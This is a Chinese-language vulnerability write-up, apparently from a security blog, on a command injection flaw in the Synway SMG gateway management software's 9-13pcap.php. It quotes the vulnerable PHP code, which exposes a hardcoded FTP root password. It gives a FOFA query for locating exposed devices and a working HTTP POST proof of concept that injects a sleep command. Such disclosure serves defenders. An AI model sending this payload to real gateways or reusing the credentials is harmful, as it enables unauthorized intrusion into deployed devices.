---
title: "Synway SMG网关管理软件 9-13pcap.php 命令注入漏洞"
source: https://mrxn.net/jswz/synway-9-13pcap-rce.html
asset_dir: assets/synway-smg网关管理软件-9-13pcap.php-命令注入漏洞
---

# Synway SMG网关管理软件 9-13pcap.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/2 14:32
- 1402浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

Windows安全工具

SQL注入检测工具

网络安全会议

---

# 漏洞简介

三汇SMG 网关管理软件是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。由于 `9-13pcap.php` 参数 `slave` 的处理不当，导致[命令注入](https://mrxn.net/tag/rce)问题，攻击者可以通过远程发起攻击。

# fofa语法

> `body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")`

# 漏洞分析

直接看 9-13pcap.php 关键业务逻辑实现部分

```
if($_POST[slave_download] != '')
{
    $slave = $_POST[slave];
    $file = "/usr/local/apache/htdocs/Config/lan3_slave$slave.tar.gz";
    $file_remote = '/usr/local/apache/htdocs/Config/lan3.tar.gz';
    exec("ftpget -u root -p root13173137 $ClientIp[$slave] $file $file_remote $background");
    $result = download($file,0);
    if($result == false)
    {
        echo "<script language=javascript>history.back();</script>";
    }
}
```

当 `slave_download` 不为空时，直接将 `slave` 值拼接进 `$file` 和 `exec` 命令中，无任何过滤和校验，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

漏洞利用示例

```
POST /en/9-13pcap.php HTTP/1.1
Host: synway.mrxn.net
Content-Type: application/x-www-form-urlencoded

slave_download=1&slave=+;sleep 5;+#+
```

执行 `sleep 5` 命令，成功延时 5 秒

[![Synway SMG网关管理软件 9-13pcap.php 命令注入漏洞](images/img-001-7e629ea95354.webp)](https://image.mrxn.net/28da1eb792e74c1f993ebdf63797843f.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
